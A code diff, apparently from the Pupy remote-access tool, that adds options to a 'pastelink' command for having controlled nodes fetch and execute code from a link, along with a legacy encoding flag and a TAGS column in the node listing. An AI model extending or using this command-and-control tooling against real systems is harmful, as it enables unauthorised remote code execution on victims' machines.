@@ -84,8 +84,12 @@ pastelink = commands.add_parser('pastelink', help='Execute code by link to paste
 pastelink.add_argument('-a', '--action', choices=['exec', 'pyexec', 'sh'], default='pyexec',
                            help='Action - execute as executable, or evaluate as python/sh code')
 pastelink_src = pastelink.add_mutually_exclusive_group(required=True)
-pastelink_src.add_argument('-c', '--create', help='Create new pastelink from file')
+pastelink_src.add_argument('-c', '--create', metavar='<SRC>', help='Create new pastelink from file')
+pastelink_src.add_argument('-C', '--create-content', metavar=('<SRC>', '<DST>'), nargs=2,
+                           help='Create new content from file and store content to specified path')
 pastelink_src.add_argument('-u', '--url', help='Specify existing URL')
+pastelink.add_argument('-1', '--legacy', default=False,
+                       action='store_true', help='Encrypt using legacy V1 encoder')
 
 dexec = commands.add_parser('dexec', help='Execute code by link to service controlled by you')
 dexec.add_argument('-a', '--action', choices=['exec', 'pyexec', 'sh'], default='pyexec',
@@ -355,7 +359,7 @@ def do(server, handler, config, args):
                 'IDLE': '{}s'.format(node.idle),
                 'DURATION': '{}s'.format(node.duration),
                 'CMDS': '{}'.format(len(node.commands)),
-                'TAGS': '{}'.format(config.tags(node)),
+                'TAGS': '{}'.format(config.tags(node.node)),
             }
 
             pupy_session = None
@@ -383,7 +387,7 @@ def do(server, handler, config, args):
 
         columns = [
             '#', 'P', 'NODE', 'IID', 'VERSION',
-            'CID', 'IDLE', 'DURATION', 'CMDS'
+            'CID', 'IDLE', 'DURATION', 'CMDS', 'TAGS'
         ]
 
         handler.display(Table(objects, columns))
@@ -542,12 +546,22 @@ def do(server, handler, config, args):
 
     elif args.command == 'pastelink':
         try:
+            create = None
+            output = None
+
+            if args.create:
+                create = args.create
+            elif args.create_content:
+                create, output = args.create_content
+
             count, url = server.dnscnc.pastelink(
                 content=args.create,
+                output=output,
                 url=args.url,
                 action=args.action,
                 node=args.node,
-                default=args.default
+                default=args.default,
+                legacy=args.legacy
             )
 
             handler.display(Success('URL: {}'.format(url)))
